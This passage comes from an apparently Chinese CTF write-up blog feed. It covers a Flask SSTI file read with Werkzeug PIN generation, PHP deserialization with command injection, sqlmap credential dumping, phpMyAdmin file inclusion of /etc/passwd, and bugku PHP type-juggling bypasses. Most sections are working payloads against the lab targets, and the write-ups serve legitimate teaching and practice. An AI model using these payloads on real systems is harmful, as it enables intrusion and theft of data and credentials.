&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3Byb2Mvc2VsZi9jZ3JvdXAnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</span><br><span class="line"></span><br><span class="line">12:freezer:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 11:cpuset:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 10:cpu,cpuacct:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 9:devices:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 8:hugetlb:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 7:blkio:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 6:memory:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 5:pids:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 4:net_cls,net_prio:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 3:rdma:&#x2F; 2:perf_event:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 1:name&#x3D;systemd:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320 0::&#x2F;system.slice&#x2F;containerd.service</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;etc&#x2F;machine-id&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL2V0Yy9tYWNoaW5lLWlkJywgJ3InKS5yZWFkKCkgfX17JSBlbmRpZiAlfXslIGVuZGZvciAlfQ&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">81ef01dec0f0eb6d6c0f3752b487b10e</span><br></pre></td></tr></table></figure>
<p>利用获取到的信息爆破pin</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits &#x3D; [</span><br><span class="line">	&#39;flaskweb&#39;,# username</span><br><span class="line">	&#39;flask.app&#39;,# modname</span><br><span class="line">	&#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span><br><span class="line">	&#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # getattr(mod, &#39;__file__&#39;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits &#x3D; [</span><br><span class="line">	&#39;2485377957898&#39;,# str(uuid.getnode()),  &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</span><br><span class="line">	&#39;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320&#39;</span><br><span class="line">    # get_machine_id(), &#x2F;etc&#x2F;machine-id</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h &#x3D; hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">	if not bit:</span><br><span class="line">		continue</span><br><span class="line">	if isinstance(bit, str):</span><br><span class="line">		bit &#x3D; bit.encode(&#39;utf-8&#39;)</span><br><span class="line">	h.update(bit)</span><br><span class="line">h.update(b&#39;cookiesalt&#39;)</span><br><span class="line"></span><br><span class="line">cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num &#x3D; None</span><br><span class="line">if num is None:</span><br><span class="line">	h.update(b&#39;pinsalt&#39;)</span><br><span class="line">	num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv &#x3D;None</span><br><span class="line">if rv is None:</span><br><span class="line">	for group_size in 5, 4, 3:</span><br><span class="line">		if len(num) % group_size &#x3D;&#x3D; 0:</span><br><span class="line">			rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)</span><br><span class="line">						  for x in range(0, len(num), group_size))</span><br><span class="line">			break</span><br><span class="line">	else:</span><br><span class="line">		rv &#x3D; num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
<ul>
<li>利用pin码进入debug界面</li>
<li>读取flag</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">os.listdir(&#39;&#x2F;&#39;)</span><br><span class="line">open(&#39;this_is_the_flag.txt&#39;,&#39;r&#39;).read()</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200224/cHRqseYnAQrj.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200224/cHRqseYnAQrj.png?imageslim" alt="mark"></a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>合天御宅战疫-web-wp</title>
    <url>/2020/02/29/CTF_WP/hetian/</url>
    <content><![CDATA[<h1 id="合天御宅战疫-web-wp"><a href="#合天御宅战疫-web-wp" class="headerlink" title="合天御宅战疫-web-wp"></a>合天御宅战疫-web-wp</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><a id="more"></a>

<p>如图所示</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/q0Oocw0yWWOb.jpg?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/q0Oocw0yWWOb.jpg?imageslim" alt="mark"></a></p>
<p>改成key{XXXX}提交</p>
<h2 id="脑袋有点大"><a href="#脑袋有点大" class="headerlink" title="脑袋有点大"></a>脑袋有点大</h2><p>用bp抓包,在响应中找到key</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/dFQYs1BGYQOz.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/dFQYs1BGYQOz.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/IORN4qHb421z.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/IORN4qHb421z.png?imageslim" alt="mark"></a></p>
<h2 id="统一登录"><a href="#统一登录" class="headerlink" title="统一登录"></a>统一登录</h2><p>打开界面,要登陆,登录不上,用dirmap扫一下目录</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/TskYQljtjGHy.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/TskYQljtjGHy.png?imageslim" alt="mark"></a></p>
<p>找到源码泄露,下载下来</p>
<p>代码审计</p>
<p>在common文件夹下找到home.php,wakeup函数有一个waf过滤,最下方的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;@$_POST[&#39;a&#39;];</span><br><span class="line">@unserialize($a);</span><br></pre></td></tr></table></figure>
<p>可以想到构造反序列化对象,直接执行我们构造的对象,利用system函数,home后面的数字大于2可以绕过wakeup函数从而绕过过滤</p>
<p>构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;O:4:&quot;home&quot;:3:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:26:&quot;127.0.0.1;cat &#x2F;opt&#x2F;key.txt&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/Yj8LhB4w1QSC.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/Yj8LhB4w1QSC.png?imageslim" alt="mark"></a></p>
<h2 id="后台key"><a href="#后台key" class="headerlink" title="后台key"></a>后台key</h2><p><a href="https://blogjpg.yanmy.top/blog/20200229/kX2mbF9SLn2B.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/kX2mbF9SLn2B.png?imageslim" alt="mark"></a></p>
<p>存在数字型sql注入</p>
<p>用sqlmap跑一下</p>
<p>爆库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot;  -p &quot;cid&quot; --dbs</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/BE5Um90VnzOE.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/BE5Um90VnzOE.png?imageslim" alt="mark"></a></p>
<p>爆表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot;  -p &quot;cid&quot; -D seacms --tables</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/hLkw8QttXHQP.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/hLkw8QttXHQP.png?imageslim" alt="mark"></a></p>
<p>爆字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot;  -p &quot;cid&quot; -D seacms -T manage --columns</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/i8fCB3zOQGEY.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/i8fCB3zOQGEY.png?imageslim" alt="mark"></a></p>
<p>爆内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;118.190.100.227:5001&#x2F;?r&#x3D;content&amp;cid&#x3D;1&quot;  -p &quot;cid&quot; -D seacms -T manage -C user,password --dump</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/fM6cHxBQX6As.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/fM6cHxBQX6As.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/pTU7n82U9Swj.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/pTU7n82U9Swj.png?imageslim" alt="mark"></a></p>
<p>得到用户名和密码后,由于密码MD5加密了,所以用md5解密一下,得到密码登录系统,根据提示找到key</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/Ppjbm5Y8SrTk.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/Ppjbm5Y8SrTk.png?imageslim" alt="mark"></a></p>
<h2 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h2><p><a href="https://blogjpg.yanmy.top/blog/20200229/4pCgjJT5hHRV.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/4pCgjJT5hHRV.png?imageslim" alt="mark"></a></p>
<p>打开发现静止访问,但是响应码为200说明可能因为是后台登录系统做了限制,改xff头后顺利访问</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/HK6RCODAJsFr.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/HK6RCODAJsFr.png?imageslim" alt="mark"></a></p>
<p>使用万能密码登录,成功获取key</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/hznWs2Nj07se.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/hznWs2Nj07se.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/F2DufvYCsrhm.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/F2DufvYCsrhm.png?imageslim" alt="mark"></a></p>
<h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><p><a href="https://blogjpg.yanmy.top/blog/20200229/MybinCxjXJSb.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/MybinCxjXJSb.png?imageslim" alt="mark"></a></p>
<p>根目录下面的robots.txt指明了key的位置</p>
<p>通过增加常用文件名phpmyadmin,成功找到登录地址</p>
<p>用弱口令root/root登录后,先尝试包含/etc/passwd判断目录层级</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.215.40.251:5002&#x2F;phpmyadmin&#x2F;index.php?a&#x3D;phpinfo();&amp;target&#x3D;export.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/V7A676OjqiFP.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/V7A676OjqiFP.png?imageslim" alt="mark"></a></p>
<p>然后再去包含key</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.215.40.251:5002&#x2F;phpmyadmin&#x2F;index.php?a&#x3D;phpinfo();&amp;target&#x3D;export.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;opt&#x2F;key.txt</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200229/5KWYUpGJCx4T.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200229/5KWYUpGJCx4T.png?imageslim" alt="mark"></a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>安恒2020四月赛</title>
    <url>/2020/04/25/CTF_WP/%E5%AE%89%E6%81%922020%E5%9B%9B%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="安恒2020四月赛"><a href="#安恒2020四月赛" class="headerlink" title="安恒2020四月赛"></a>安恒2020四月赛</h1><p>只会做做简单题混混分😢</p>
<a id="more"></a>

<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line">function write ($data) &#123;</span><br><span class="line">	return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read ($data) &#123;</span><br><span class="line">	return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">	public $username;</span><br><span class="line">	public $password;</span><br><span class="line"></span><br><span class="line">	function __construct ($a, $b) &#123;</span><br><span class="line">		$this-&gt;username &#x3D; $a;</span><br><span class="line">		$this-&gt;password &#x3D; $b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B &#123;</span><br><span class="line">	public $b &#x3D;&quot;gpy&quot;;</span><br><span class="line">	function __destruct () &#123;</span><br><span class="line">		$c &#x3D; &#39;a&#39; . $this-&gt;b;</span><br><span class="line">		echo $c;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C &#123;</span><br><span class="line">	public $c;</span><br><span class="line"></span><br><span class="line">	function __toString () &#123;</span><br><span class="line">		&#x2F;&#x2F;flag.php</span><br><span class="line">		echo file_get_contents($this-&gt;c);</span><br><span class="line">		return &#39;nice&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);</span><br><span class="line">$b &#x3D; unserialize(read(write(serialize($a))));</span><br><span class="line">function read ($data) &#123;</span><br><span class="line">	return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>read函数将<code>chr(0) . &#39;*&#39; . chr(0)</code>变为<code>\0\0\0</code>,但是前者只有三个字符,后者有六个字符,那么就会导致字符逃逸。</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b&#x3D;;s:&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="6G签到"><a href="#6G签到" class="headerlink" title="6G签到"></a>6G签到</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl --range 0-100 http:&#x2F;&#x2F;balabala&#x2F;1Gfile.file</span><br></pre></td></tr></table></figure>
<h3 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h3><p>下载是个流量包</p>
<p>简单浏览一下，是蓝牙的流量。</p>
<p>先按协议排一下序</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200425/GegNB3OYmHCW.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200425/GegNB3OYmHCW.png?imageslim" alt="mark"></a></p>
<p>找蓝牙的传输协议OBEX</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200425/UgRLRbitaEmw.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200425/UgRLRbitaEmw.png?imageslim" alt="mark"></a></p>
<p>把7z压缩包的数据块复制出来，用winhex或者010editor保存成7z文件，解压，要PIN</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200425/0LBErJCiGVVb.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200425/0LBErJCiGVVb.png?imageslim" alt="mark"></a></p>
<p>去掉过滤器，<code>ctrl+f</code>查找一下有没有PIN，发现有的，解压得到flag</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200425/PrkpItBPzngw.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200425/PrkpItBPzngw.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200425/iWTFkcKX62gx.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200425/iWTFkcKX62gx.png?imageslim" alt="mark"></a></p>
<p><strong>好好学习，天天向上</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku代码审计</title>
    <url>/2019/07/16/CTF_WP/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%B1%BB%E5%88%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93%E5%92%8Cbugku%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<h1 id="bugku代码审计"><a href="#bugku代码审计" class="headerlink" title="bugku代码审计"></a>bugku代码审计</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>一下只是个人的一点拙见，请大佬轻喷，欢迎大佬补充，很多不恰当的地方。</p>
<a id="more"></a>

<h2 id="0x00-extract变量覆盖"><a href="#0x00-extract变量覆盖" class="headerlink" title="0x00 extract变量覆盖"></a>0x00 extract变量覆盖</h2><h3 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a><a href="http://123.206.87.240:9009/1.php">题目地址</a></h3><h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag&#x3D;&#39;xxx&#39;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($shiyan))&#123;</span><br><span class="line">	$content&#x3D;trim(file_get_contents($flag));</span><br><span class="line">	if($shiyan&#x3D;&#x3D;$content)&#123;</span><br><span class="line">		echo&#39;flag&#123;xxx&#125;&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		echo&#39;Oh.no&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeip"><a href="#writeip" class="headerlink" title="writeip"></a>writeip</h3><ol>
<li><p>构造payload:</p>
<p><a href="http://123.206.87.240:9009/1.php?shjyan=&amp;flag=">http://123.206.87.240:9009/1.php?shjyan=&amp;flag=</a></p>
<p>覆盖原有的flag变量，是空==空成立，输出flag</p>
</li>
</ol>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>flag{bugku-dmsj-p2sm3N}</p>
<h3 id="extract用法"><a href="#extract用法" class="headerlink" title="extract用法"></a>extract用法</h3><p>(PHP 4, PHP 5, PHP 7)</p>
<p>extract — 从数组中将变量导入到当前的符号表</p>
<h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extract ( array &amp;$array [, int $flags &#x3D; EXTR_OVERWRITE [, string $prefix &#x3D; NULL ]] ) : int</span><br></pre></td></tr></table></figure>
<p> 本函数用来将变量从数组中导入到当前的符号表中。</p>
<p> 检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。</p>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><ul>
<li><p><code>array</code></p>
<p> 一个关联数组。此函数会将键名当作变量名，值作为变量的值。对每个键／值对都会在当前的符号表中建立变量，并受到 <code>flags</code>和<code>prefix</code>参数的影响。必须使用关联数组，数字索引的数组将不会产生结果，除非用了<code>EXTR_PREFIX_ALL</code>或者<code>EXTR_PREFIX_INVALID</code>。</p>
</li>
<li><p><code>flags</code></p>
<p>对待非法／数字和冲突的键名的方法将根据取出标记<code>flags</code>参数决定。可以是以下值之一：</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>EXTR_OVERWRITE</code></td>
<td align="left">如果有冲突，覆盖已有的变量。</td>
</tr>
<tr>
<td align="left"><code>EXTR_SKIP</code></td>
<td align="left">如果有冲突，不覆盖已有的变量。</td>
</tr>
<tr>
<td align="left"><code>EXTR_PREFIX_SAME</code></td>
<td align="left">如果有冲突，在变量名前加上前缀 <code>prefix</code>。</td>
</tr>
<tr>
<td align="left"><code>EXTR_PREFIX_ALL</code></td>
<td align="left">给所有变量名加上前缀<code>prefix</code>。</td>
</tr>
<tr>
<td align="left"><code>EXTR_PREFIX_INVALID</code></td>
<td align="left">仅在非法／数字的变量名前加上前缀 <code>prefix</code>。</td>
</tr>
<tr>
<td align="left"><code>EXTR_IF_EXISTS</code></td>
<td align="left">仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。举个例子，以下情况非常有用：定义一些有效变量，然后从 <code>$_REQUEST</code> 中仅导入这些已定义的变量。</td>
</tr>
<tr>
<td align="left"><code>EXTR_PREFIX_IF_EXISTS</code></td>
<td align="left">仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</td>
</tr>
<tr>
<td align="left"><code>EXTR_REFS</code></td>
<td align="left">将变量作为引用提取。这有力地表明了导入的变量仍然引用了<code>array</code> 参数的值。可以单独使用这个标志或者在<code>flags</code> 中用 OR 与其它任何标志结合使用。</td>
</tr>
<tr>
<td align="left">备注</td>
<td align="left">如果没有指定 flags，则被假定为 <code>EXTR_OVERWRITE</code>。</td>
</tr>
</tbody></table>
</li>
<li><p><code>prefix</code></p>
<p>注意 ：</p>
<p><code>prefix</code>仅在<code>flags</code>的值是<code>EXTR_PREFIX_SAME</code>，<code>EXTR_PREFIX_ALL</code>，<code>EXTR_PREFIX_INVALID</code>或 <code>EXTR_PREFIX_IF_EXISTS</code>时需要。</p>
<p>如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。前缀和数组键名之间会自动加上一个下划线。</p>
</li>
</ul>
<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p> 返回成功导入到符号表中的变量数目。</p>
<h2 id="0x01strcmp比较字符串"><a href="#0x01strcmp比较字符串" class="headerlink" title="0x01strcmp比较字符串"></a>0x01strcmp比较字符串</h2><h3 id="题目地址-1"><a href="#题目地址-1" class="headerlink" title="题目地址"></a><a href="http://123.206.87.240:9009/6.php">题目地址</a></h3><h3 id="题目源码-1"><a href="#题目源码-1" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&#39;a&#39;])) &#123; </span><br><span class="line">	if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 </span><br><span class="line">        &#x2F;&#x2F;比较两个字符串（区分大小写） </span><br><span class="line">		die(&#39;Flag: &#39;.$flag); </span><br><span class="line">	else </span><br><span class="line">		print &#39;No&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li><p>用数组绕过，构造payload:</p>
<p><a href="http://123.206.87.240:9009/6.php?a%5B%5D=1">http://123.206.87.240:9009/6.php?a[]=1</a></p>
</li>
</ol>
<h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p>flag{bugku_dmsj_912k}</p>
<h2 id="0x02urldecode二次编码绕过"><a href="#0x02urldecode二次编码绕过" class="headerlink" title="0x02urldecode二次编码绕过"></a>0x02urldecode二次编码绕过</h2><h3 id="题目地址-2"><a href="#题目地址-2" class="headerlink" title="题目地址"></a><a href="http://123.206.87.240:9009/10.php">题目地址</a></h3><h3 id="题目源码-2"><a href="#题目源码-2" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">	echo(&quot;not allowed!&quot;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;Access granted!&quot;;</span><br><span class="line">	echo &quot;flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h3><ol>
<li>浏览器会对get参数进行一次URL编码，源码中还有一次，两次编码绕过验证。</li>
<li>对hackerDJ两次URL编码构造payload:</li>
</ol>
<p><a href="http://123.206.87.240:9009/10.php?id=hackerDJ">http://123.206.87.240:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</a></p>
<h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p>flag{bugku__daimasj-1t2}</p>
<h2 id="0x03md5-函数"><a href="#0x03md5-函数" class="headerlink" title="0x03md5()函数"></a>0x03md5()函数</h2><h3 id="题目地址-3"><a href="#题目地址-3" class="headerlink" title="题目地址"></a><a href="http://123.206.87.240:9009/18.php">题目地址</a></h3><h3 id="题目源码-3"><a href="#题目源码-3" class="headerlink" title="题目源码"></a>题目源码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag &#x3D; &#39;flag&#123;test&#125;&#39;;</span><br><span class="line">if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">	if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])</span><br><span class="line">		print &#39;Your password can not be your username.&#39;;</span><br><span class="line">	else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;]))</span><br><span class="line">		die(&#39;Flag: &#39;.$flag);</span><br><span class="line">	else</span><br><span class="line">		print &#39;Invalid password&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
